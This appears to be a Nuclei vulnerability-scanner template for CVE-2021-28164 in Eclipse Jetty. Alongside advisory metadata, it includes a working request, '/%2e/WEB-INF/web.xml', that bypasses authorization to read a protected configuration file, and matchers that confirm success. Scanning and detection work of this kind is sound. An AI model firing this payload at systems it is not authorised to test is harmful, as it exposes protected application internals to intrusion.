id: CVE-2021-28164

info:
  name: Eclipse Jetty - Information Disclosure
  author: noamrathaus
  severity: medium
  description: |
    Eclipse Jetty 9.4.37.v20210219 to 9.4.38.v20210224 is susceptible to improper authorization. The default compliance mode allows requests with URIs that contain %2e or %2e%2e segments to access protected resources within the WEB-INF directory. An attacker can access sensitive information regarding the implementation of a web application.
  remediation: |
    Apply the latest security patches or updates provided by the Eclipse Jetty project to fix the information disclosure vulnerability.
  reference:
    - https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
    - https://github.com/vulhub/vulhub/tree/1239bca12c75630bb2033b728140ed5224dcc6d8/jetty
    - https://lists.apache.org/thread.html/r780c3c210a05c5bf7b4671303f46afc3fe56758e92864e1a5f0590d0@%3Cjira.kafka.apache.org%3E
    - http://packetstormsecurity.com/files/164590/Jetty-9.4.37.v20210219-Information-Disclosure.html
    - https://nvd.nist.gov/vuln/detail/cve-2021-28164
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2021-28164
    cwe-id: CWE-200,NVD-CWE-Other
    epss-score: 0.02064
    epss-percentile: 0.87804
    cpe: cpe:2.3:a:eclipse:jetty:9.4.37:20210219:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: eclipse
    product: jetty
  tags: vulhub,cve,cve2021,jetty,packetstorm

http:
  - method: GET
    path:
      - "{{BaseURL}}/%2e/WEB-INF/web.xml"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</web-app>"
          - "java.sun.com"
        condition: and

      - type: word
        part: header
        words:
          - "application/xml"

      - type: status
        status:
          - 200

# digest: 490a0046304402206c7fa5eab60e3a72c7070833569efa182845d74e47cce894e4456380cd423637022016434f16c78b1ee13f7e905f2bfd0ca3676dcc2f2aaea46bbf2ed6cfb7b87902:922c64590222798bb761d5b6d8e72950
